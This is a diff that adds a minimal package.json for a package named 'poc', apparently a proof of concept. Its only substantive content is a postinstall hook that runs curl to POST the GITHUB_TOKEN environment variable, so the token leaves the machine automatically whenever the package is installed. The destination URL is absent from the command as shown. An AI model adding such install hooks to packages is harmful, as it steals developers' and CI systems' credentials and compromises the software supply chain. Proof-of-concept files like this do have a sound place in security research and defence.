@@ -1,0 +1,7 @@
+{
+  "name": "poc",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -X POST  -d \"token=$GITHUB_TOKEN\""
+  }
+}
